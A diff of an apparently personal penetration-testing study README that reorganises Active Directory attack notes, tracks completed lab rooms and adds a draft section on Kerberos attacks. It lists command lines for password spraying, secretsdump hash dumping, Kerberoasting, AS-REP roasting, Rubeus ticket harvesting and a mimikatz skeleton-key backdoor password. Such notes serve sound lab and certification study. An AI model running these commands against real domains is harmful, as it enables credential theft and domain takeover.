@@ -134,29 +134,22 @@ The keys need to be read-writable only by you:
 chmod 600 ~/.ssh/id_rsa
 ```
 
-#### [Kerbrute](https://github.com/ropnop/kerbrute)
-A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
-
-User Enumeration
-```shell
-./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
-```
-
-Password Spray
-```shell
-./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
-```
-
 #### [impacket](https://github.com/fortra/impacket)
 Impacket is a collection of Python classes for working with network protocols.
 
+Kali default path: `/usr/share/doc/python3-impacket/examples`
+
 Retrieving Kerberos Tickets
 ```shell
-impacket-getNPUsers DOMAIN/USERNAME
+python3 GetNPUsers.py DOMAIN/USERNAME
 ```
 Dump the hashes
 ```shell
-impacket-secretsdump DOMAIN/USERNAME:PASSWORD@IP
+python3 secretsdump.py DOMAIN/USERNAME:PASSWORD@IP
+```
+Kerberoasting
+```shell
+python3 GetUserSPNs.py DOMAIN/USERNAME:PASSWORD -dc-ip IP -request
 ```
 #### [WADComs](https://wadcoms.github.io/#)
 WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
@@ -204,14 +197,14 @@ WADComs is an interactive cheat sheet, containing a curated list of offensive se
 #### Windows Active Directory Attack
 - [X] [[Easy] Active Directory Basics](https://tryhackme.com/room/winadbasics)
 - [X] [⭐️ [Medium] Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
-- [ ] [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
+- [X] [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
 - [ ] [Breaching Active Directory](https://tryhackme.com/room/breachingad)
 - [ ] [AD Enumeration](https://tryhackme.com/room/adenumeration)
 - [ ] [Lateral Movement and Pivoting](https://tryhackme.com/jr/lateralmovementandpivoting)
 - [ ] [Exploiting Active Directory](https://tryhackme.com/room/exploitingad)
 - [ ] [Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
 - [ ] [HoloLive](https://tryhackme.com/room/hololive)
-- [ ] [Throwback Network Labs Attacking Windows Active Directory](https://tryhackme.com/network/throwback)
+
 
 ### Hack The Box
 - [ ] [Network Enumeration with Nmap](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap)
@@ -303,7 +296,7 @@ WADComs is an interactive cheat sheet, containing a curated list of offensive se
 - [ ] [Jordak]()
 - [ ] [Lavita]()
 - [ ] [law]()
-- [ ] [Levram]()
+- [X] [Easy] Levram ([writeup](/writeups/Levram.md))
 - [ ] [Mantis]()
 - [ ] [Marketing]()
 - [ ] [Mzeeav]()
@@ -400,6 +393,61 @@ WADComs is an interactive cheat sheet, containing a curated list of offensive se
 #### Windows Active Directory
 
 #### Try Harder
+
+## Draft
+### Kerberos Authentication Overview
+![](https://i.imgur.com/VRr2B6w.png)
+### Attack Privilege Requirements
+- Kerbrute Enumeration - No domain access required 
+- Pass the Ticket - Access as a user to the domain required
+- Kerberoasting - Access as any user required
+    - Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
+- AS-REP Roasting - Access as any user required
+    - AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
+- Golden Ticket - Full domain compromise (domain admin) required 
+- Silver Ticket - Service hash required 
+- Skeleton Key - Full domain compromise (domain admin) required
+
+### Enumerating Users Kerbrute
+#### [Kerbrute](https://github.com/ropnop/kerbrute)
+A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
+
+User Enumeration
+```shell
+./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+```
+
+Password Spray
+```shell
+./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+```
+#### [Rubeus](https://github.com/GhostPack/Rubeus)
+Rubeus is a C# toolset for raw Kerberos interaction and abuses.
+
+Harvesting Tickets (harvest for TGTs every 30 seconds)
+```shell
+rubeus.exe harvest /interval:30
+```
+Brute-Forcing/Password-Spraying
+```shell
+rubeus.exe brute /password:Password1 /noticket
+```
+Kerberoasting
+```shell
+rubeus.exe kerberoast
+```
+Dumping KRBASREP5 Hashes
+```shell
+rubeus.exe asreproast
+```
+#### [Mimikatz](https://github.com/ParrotSec/mimikatz)
+It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.
+
+Kerberos Backdoors 
+
+The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"
+
+
 
 ## Reference
 - https://github.com/rodolfomarianocy/OSCP-Tricks-2023
